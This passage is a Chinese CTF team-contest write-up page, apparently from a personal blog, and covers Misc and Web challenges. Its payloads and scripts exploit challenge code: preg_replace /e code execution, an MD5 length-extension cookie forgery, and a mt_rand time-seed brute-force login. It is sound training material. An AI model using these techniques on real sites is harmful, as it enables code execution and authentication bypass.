@@ -1,0 +1,893 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="WriteUp,CTF," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="https://github.com/Windylh/image/raw/master/icon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="题目地址
+Misczip ？？题目带了个？？，猜测是伪加密。用ue打开zip。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="5.2小组赛WriteUp">
+<meta property="og:url" content="http://yoursite.com/2017/05/26/5.6小组赛WriteUp/index.html">
+<meta property="og:site_name" content="Windylh's blog">
+<meta property="og:description" content="题目地址
+Misczip ？？题目带了个？？，猜测是伪加密。用ue打开zip。">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.5.7/Misc1-1.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.5.7/Misc3-1.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.5.7/Web2.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.5.7/Re1-1.png">
+<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.5.7/Re1-2.png">
+<meta property="og:updated_time" content="2017-05-26T14:12:20.117Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="5.2小组赛WriteUp">
+<meta name="twitter:description" content="题目地址
+Misczip ？？题目带了个？？，猜测是伪加密。用ue打开zip。">
+<meta name="twitter:image" content="https://github.com/Windylh/image/raw/master/2017.5.7/Misc1-1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/05/26/5.6小组赛WriteUp/"/>
+
+
+
+
+
+  <title> 5.2小组赛WriteUp | Windylh's blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Windylh's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/26/5.6小组赛WriteUp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                5.2小组赛WriteUp
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-26T22:07:14+08:00">
+                2017-05-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/05/26/5.6小组赛WriteUp/" class="leancloud_visitors" data-flag-title="5.2小组赛WriteUp">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><a href="https://github.com/Windylh/CTF/tree/master/%E9%98%9F%E5%86%85%E8%B5%9B/2017.5.6" target="_blank" rel="external">题目地址</a></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="zip-？？"><a href="#zip-？？" class="headerlink" title="zip ？？"></a>zip ？？</h3><p>题目带了个？？，猜测是伪加密。用ue打开zip。<br><a id="more"></a><br><img src="https://github.com/Windylh/image/raw/master/2017.5.7/Misc1-1.png" alt="1-1"><br>将09部分改为00，成功解压。<br>flag:<code>congr4tul4tion_thi3_13_fl4g</code></p>
+<h3 id="base的n次方"><a href="#base的n次方" class="headerlink" title="base的n次方"></a>base的n次方</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">a = <span class="string">"flag&#123;&#125;"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1</span>,<span class="number">30</span>):</div><div class="line">    b = random.randint(<span class="number">1</span> , <span class="number">3</span>)</div><div class="line">    <span class="keyword">if</span> b ==<span class="number">1</span>:</div><div class="line">        a= base64.b16encode(a)</div><div class="line">    <span class="keyword">elif</span> b==<span class="number">2</span>:</div><div class="line">        a= base64.b64encode(a)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        a= base64.b32encode(a)</div><div class="line">s= open(<span class="string">"flagencode.txt"</span>,<span class="string">"w"</span>)</div><div class="line">s.write(a)</div><div class="line"><span class="keyword">print</span> <span class="string">"done!!!"</span></div></pre></td></tr></table></figure>
+<p>base64、32、16是随机的，加密了30次，python脚本用try处理报错。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line">a=<span class="string">''</span></div><div class="line">s= open(<span class="string">"flagencode.txt"</span>)</div><div class="line">a=s.read()</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1</span>,<span class="number">30</span>):</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        a=base64.b16decode(a)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            a=base64.b32decode(a)</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            a=base64.b64decode(a)</div><div class="line">print(a)</div></pre></td></tr></table></figure></p>
+<p>flag：<code>B43e_i3_s0_e43y_hiahiahia</code></p>
+<h3 id="shark"><a href="#shark" class="headerlink" title="shark"></a>shark</h3><p>下载pcapng文件，打开，发现http头有一个flag.zip。</p>
+<p>提取文件，zip文件被加密了。再去查看http头。<br><img src="https://github.com/Windylh/image/raw/master/2017.5.7/Misc3-1.png" alt="3-1"><br>http头中有：<code>Authorization: Basic ZmxhZzphenVsY3JlbWE=</code>，base64解密<code>flag:azulcrema</code>，用他解压zip。<br>flag：<code>HTTP_BASIC_AUTH_IS_EASY</code></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Preg"><a href="#Preg" class="headerlink" title="Preg"></a>Preg</h3><p>代码审计。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">error_reporting(<span class="number">0</span>); </div><div class="line"><span class="keyword">require_once</span>(<span class="string">"flag.php"</span>); </div><div class="line"><span class="keyword">if</span>(!$passwd) </div><div class="line">&#123; </div><div class="line">  $passwd=$_POST[<span class="string">"passwd"</span>]; </div><div class="line">&#125; </div><div class="line"><span class="keyword">if</span>(!$lockedtxt) </div><div class="line">&#123; </div><div class="line">  $lockedtxt=$_POST[<span class="string">"lockedtxt"</span>]; </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">flag</span><span class="params">($var)</span> </span></div><div class="line">&#123; </div><div class="line">  <span class="keyword">echo</span> $var; </div><div class="line">&#125; </div><div class="line"><span class="keyword">if</span>($key) </div><div class="line">&#123; </div><div class="line">  $unlockedtxt=preg_replace($passwd,$key,$lockedtxt); </div><div class="line">&#125; </div><div class="line"><span class="keyword">if</span>($unlockedtxt===$flag) </div><div class="line">&#123; </div><div class="line">  flag(<span class="string">"The Correct: "</span>); </div><div class="line">  flag($flag); </div><div class="line">&#125; </div><div class="line"></div><div class="line">show_source(<span class="string">"index.php"</span>); </div><div class="line"><span class="comment">// key=flag(\\1) </span></div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>搜索<code>preg_replace()</code>漏洞，发现了：<code>http://www.jb51.net/article/38714.htm</code><br>可以利用函数及修饰符<code>/e</code>执行代码。</p>
+<p>最后一行给出<code>key=flag(\\1)</code>,<code>\\1</code>为逆向引用，也就是引用第一个括号的内容，我们要想利用<code>/e</code>执行代码，就要执行<code>flag($flag)</code>来输出。也就是说要让正则括号内容匹配到<code>$flag</code>。</p>
+<p><a href="http://baike.baidu.com/link?url=zwfTStSKn0ZwM2IKPTjTdsB7KaiYEgM2Xj2W2JWFlZrNh5XWI_zcsSyf9guILGQAtvBNFjwnCZn6jhzHQNwJ_Dbro5YEBe_uAvZTmm7QQ3-OU_GtqZ3z0mri-EroNCT6yRNJCRqk7H2C_onK79db__#5" target="_blank" rel="external">正则表达式</a>+<a href="http://tool.oschina.net/regex/#" target="_blank" rel="external">在线正则表达式工具</a>终于匹配到了$flag。</p>
+<p>payload:<code>post：passwd=/1(.*)/e&amp;lockedtxt=1$flag</code></p>
+<p>flag：<code>pr3g_5wlp8q_Repl4c3</code></p>
+<h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h3><p>tip：Hash长度扩展攻击。</p>
+<p>先看php代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">$flag = <span class="string">"xxxxxxxx"</span>;</div><div class="line">$secret = <span class="string">"xxxxxxxxxxxxxxxxxxxxxxxxx"</span>; <span class="comment">// This secret is 15 characters long for security!</span></div><div class="line"></div><div class="line">$username = $_POST[<span class="string">"username"</span>];</div><div class="line">$password = $_POST[<span class="string">"password"</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</div><div class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;</div><div class="line">        <span class="keyword">if</span> ($_COOKIE[<span class="string">"getmein"</span>] == md5($secret . urldecode($username . $password))) &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</div><div class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;hello ctfer!&lt;h1&gt;"</span>;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>发现加密之后的string放在了cookie中，抓包<code>Cookie: sample-hash=be7413992c7e8541aa530688ddbbcc00</code></p>
+<p>我们不知道<code>secret</code>的值，只知道<code>secret+&#39;adminadmin&#39;</code>的md5值，且<code>password</code>不等于<code>admin</code>,判断条件是<code>$_COOKIE[&quot;getmein&quot;] == md5($secret . urldecode($username . $password))</code>，我们需要调整<code>password</code>字符串，并求出对应的md5值，对应的方法就是<br><a href="http://www.freebuf.com/articles/web/69264.html" target="_blank" rel="external"><strong>MD5长度扩展攻击</strong></a><br>从网上找了一个脚本<a href="https://github.com/Windylh/CTF/raw/master/%E9%98%9F%E5%86%85%E8%B5%9B/2017.5.6/Web2/hash_attack.py" target="_blank" rel="external">hash_attack.py</a></p>
+<p>扩展字符串，将得到的MD5用cookie的方式传入<br><img src="https://github.com/Windylh/image/raw/master/2017.5.7/Web2.png" alt="web2"><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Cookie: getmein=1decc2f82822aeb76decabbe3f864de1</div><div class="line">post:username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00windylh</div></pre></td></tr></table></figure></p>
+<p>flag：<code>H4sh_L3ngth_3xt3nsi0n_4tt4cks</code></p>
+<h3 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h3><p>tips:.git 文件泄露</p>
+<p>.git是用git会自己产生的文件，对站点自动部署。</p>
+<p>参考:<a href="http://www.freebuf.com/sectool/66096.html" target="_blank" rel="external">GitHack：一个git泄露利用脚本</a></p>
+<p>github获取GitHack，成功获取index.php的源代码。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    error_reporting(<span class="number">0</span>);</div><div class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line"></div><div class="line">    $admin_user = <span class="string">"pr0_adm1n"</span>;</div><div class="line">    $admin_pw = clean_hash(<span class="string">"0e408306536730731920197920342119"</span>);</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">clean_hash</span><span class="params">($hash)</span> </span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> preg_replace(<span class="string">"/[^0-9a-f]/"</span>,<span class="string">""</span>,$hash);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myhash</span><span class="params">($str)</span> </span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> clean_hash(md5(md5($str) . <span class="string">"SALT"</span>));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">create_password</span><span class="params">($pw_length =  <span class="number">10</span>)</span></span></div><div class="line">    &#123;</div><div class="line">      $randpwd = <span class="string">""</span>;</div><div class="line">      <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $pw_length; $i++)</div><div class="line">      &#123;</div><div class="line">        $randpwd .= chr(mt_rand(<span class="number">33</span>, <span class="number">126</span>));</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">return</span> $randpwd;</div><div class="line">    &#125;</div><div class="line">    mt_srand(time());<span class="comment">#设置了随机数的时间种子。</span></div><div class="line">    $pwd=create_password();</div><div class="line">    $logged_in = <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'user'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) </div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span>($_POST[<span class="string">'user'</span>] == $admin_user) </div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span>(myhash($_POST[<span class="string">'password'</span>]) == $admin_pw)<span class="comment">//只要让md5(md5($str) . "SALT")的开头为0e</span></div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span>($pwd==$_POST[<span class="string">'pwd'</span>])</div><div class="line">          &#123;</div><div class="line">            $logged_in = <span class="keyword">true</span>;</div><div class="line">          &#125;</div><div class="line">        &#125; </div><div class="line">        <span class="keyword">else</span> </div><div class="line">        &#123;</div><div class="line">          <span class="keyword">echo</span> <span class="string">'try harder ;)'</span>;</div><div class="line">        &#125;</div><div class="line">      &#125; </div><div class="line">      <span class="keyword">else</span> </div><div class="line">      &#123;</div><div class="line">          <span class="keyword">echo</span> <span class="string">'try harder ;)'</span>;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>($logged_in) </div><div class="line">    &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;$FLAG&lt;/p&gt;"</span>;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>首先考察的是php<code>==</code>的弱类型比较。之后就是爆破随机数部分了。</p>
+<p>参考资料：<a href="http://blog.csdn.net/u011116193/article/details/44540563" target="_blank" rel="external">用时间做种子生成随机数</a></p>
+<p>看到了<code>mt_srand(time());</code>利用了时间戳作为<code>mt_rand()</code>生成随机数的种子，那我们可以利用这个时间戳进行爆破。<br>本来打算用python实现,但是不知道<code>mt_srand()</code>的算法，只能再用php了。<br>md5部分：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">password=<span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">60000000</span>,<span class="number">70000000</span>):</div><div class="line">  password=str(i)</div><div class="line">  string=hashlib.md5((hashlib.md5(password)).hexdigest()+<span class="string">'SALT'</span>).hexdigest()</div><div class="line">  <span class="keyword">if</span> string[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">'0e'</span>:</div><div class="line">    <span class="keyword">print</span> password,string</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
+<p>得到：<code>60000767 0e681df3aca6388827ada4f30e5a2e7f</code><br>爆破随机数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">$user=<span class="string">"pr0_adm1n"</span>;</div><div class="line">$password=<span class="string">"62778807"</span>; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_password</span><span class="params">($pw_length =  <span class="number">10</span>)</span> </span></div><div class="line">&#123; </div><div class="line">  $randpwd = <span class="string">""</span>; </div><div class="line">  <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $pw_length; $i++) </div><div class="line">  &#123; </div><div class="line">    $randpwd .= chr(mt_rand(<span class="number">33</span>, <span class="number">126</span>)); </div><div class="line">  &#125; </div><div class="line">  <span class="keyword">return</span> $randpwd; </div><div class="line">&#125; </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">send_post</span><span class="params">($url, $post_data)</span> </span></div><div class="line">&#123; </div><div class="line"> </div><div class="line">  $postdata = http_build_query($post_data);</div><div class="line">  $options = <span class="keyword">array</span></div><div class="line">  (     <span class="string">'http'</span> =&gt; <span class="keyword">array</span></div><div class="line">    (       </div><div class="line">      <span class="string">'method'</span> =&gt; <span class="string">'POST'</span>,       </div><div class="line">        <span class="string">'header'</span> =&gt; <span class="string">'Content-type:application/x-www-form-urlencoded'</span>,       </div><div class="line">      <span class="string">'content'</span> =&gt; $postdata,       </div><div class="line">      <span class="string">'timeout'</span> =&gt; <span class="number">15</span> * <span class="number">60</span> <span class="comment">// 超时时间（单位 :s）</span></div><div class="line">    )   </div><div class="line">   );   </div><div class="line">   $context = stream_context_create($options);   </div><div class="line">   $result = file_get_contents($url, <span class="keyword">false</span>, $context).<span class="string">"\n"</span>; </div><div class="line">   <span class="keyword">return</span> $result; </div><div class="line">&#125; </div><div class="line"> </div><div class="line"><span class="keyword">for</span>($j=time()<span class="number">-20</span>;$j&lt;time()+<span class="number">20</span>;$j++) </div><div class="line">&#123;  </div><div class="line">  mt_srand($j);</div><div class="line">  $pwd=create_password();</div><div class="line">  <span class="keyword">echo</span> <span class="string">"pwd "</span>.$pwd.<span class="string">"\n"</span>;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"user "</span> .$user.<span class="string">"\n"</span>;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"password "</span>.$password.<span class="string">"\n"</span>;</div><div class="line">  $post_data = <span class="keyword">array</span>(    </div><div class="line">  <span class="string">'user'</span> =&gt; $user,    </div><div class="line">  <span class="string">'password'</span> =&gt; $password,   </div><div class="line">  <span class="string">'pwd'</span>=&gt;$pwd  );  </div><div class="line">  $content=send_post(<span class="string">'http://192.168.139.241:8080/coding/'</span>,$post_data);</div><div class="line">  <span class="keyword">if</span>(strpos($content,<span class="string">'SKCTF'</span>)&gt;<span class="number">-1</span>)</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">echo</span> $content;</div><div class="line">  &#125; </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>flag：<code>coding_is_fun</code></p>
+<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET) &amp;&amp; !<span class="keyword">empty</span>($_GET))&#123;</div><div class="line">    $url = $_GET[<span class="string">'file'</span>];</div><div class="line">    $path = <span class="string">"upload/"</span>.$_GET[<span class="string">'path'</span>];</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(strpos($path,<span class="string">'..'</span>) &gt; <span class="number">-1</span>)&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'SYCwaf!'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(strpos($url,<span class="string">'http://127.0.0.1/'</span>) === <span class="number">0</span>)&#123;</div><div class="line">    file_put_contents($path, file_get_contents($url));</div><div class="line">    <span class="keyword">echo</span> <span class="string">"console.log($path update successed!)"</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Hello.Geeker"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="Sql1"><a href="#Sql1" class="headerlink" title="Sql1"></a>Sql1</h3><p>查看源码：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div 